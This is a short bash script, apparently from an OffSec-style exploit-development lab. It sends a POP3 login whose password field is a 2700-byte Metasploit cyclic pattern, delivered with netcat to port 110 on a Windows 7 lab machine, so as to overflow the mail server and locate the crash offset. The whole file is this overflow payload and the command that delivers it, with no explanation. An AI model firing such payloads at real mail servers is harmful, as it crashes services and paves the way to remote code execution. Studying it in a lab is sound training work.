#!/bin/bash
python2 -c "import sys; sys.stdout.write('USER test\r\nPASS '+'$(pattern_create.rb -l 2700)' + '\r\n')" | nc -nv $WIN7_offsec_machine_ip 110
